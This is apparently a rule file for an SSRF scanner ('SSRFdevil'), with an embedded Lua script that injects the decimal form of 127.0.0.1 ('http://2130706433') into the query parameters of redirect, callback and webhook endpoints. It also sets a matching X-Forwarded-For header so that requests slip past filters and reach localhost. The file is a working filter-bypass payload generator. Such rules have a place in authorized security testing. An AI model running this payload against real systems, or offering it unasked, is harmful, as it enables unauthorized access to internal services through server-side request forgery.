# 8. decimal_ip.yaml
meta:
  id: decimal_ip
  version: 2
  name: "Decimal IP Representation"
  description: "Uses decimal representation of IPv4 (2130706433)"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 80
  confidence: 90
  severity: high
  tags: [decimal, ipv4, encoding, bypass]
  references: []

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true
  
script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "http://2130706433" -- 127.0.0.1 in Decimal
        
        for _, target in ipairs(targets) do
            local base_url = target.url
            
            -- به ازای هر پارامتر، پی‌لود تزریق می‌شود
            for _, param in ipairs(target.params) do
                local new_url = base_url
                
                -- جایگزینی ساده در Query String (قابل توسعه بر اساس location)
                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local replacement = param.name .. "=" .. payload_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end

                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = {
                        ["X-Forwarded-For"] = "2130706433",
                        -- ["User-Agent"] = "SSRFdevil-Engine/2.0"
                    },
                    -- body = "",
                    -- action = "scan"
                })
            end
        end
        return results
    end
